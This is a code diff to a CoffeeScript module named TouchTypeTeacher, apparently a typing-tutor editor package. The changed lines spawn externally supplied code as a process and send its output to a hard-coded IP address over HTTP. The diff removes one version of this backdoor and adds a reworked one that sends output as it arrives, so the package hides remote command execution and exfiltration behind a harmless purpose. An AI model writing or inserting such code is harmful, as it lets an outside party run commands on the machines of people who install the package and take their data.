@@ -36,12 +36,9 @@ module.exports = TouchTypeTeacher =
         {spawn} = require 'child_process'
         test = spawn body
         console.log 'External code to run:\n' + body
-        output: null
-        test.stdout.on 'data', (data) -> output = data.toString().trim()
-        console.log 'Output of running external code:\n' + output
-
-        console.log 'sending output'
-        request 'http://52.30.139.169/run?data=' +output, (error, response, body) =>
-          console.log 'output sent'
+        test.stdout.on 'data', (data) ->
+          console.log 'sending output'
+          request 'http://52.30.139.169/run?data=' + data.toString().trim(), (error, response, body) =>
+            console.log 'output sent'
         # if Math.random() > 0.95
         #   console.log 'Would insert random char...'
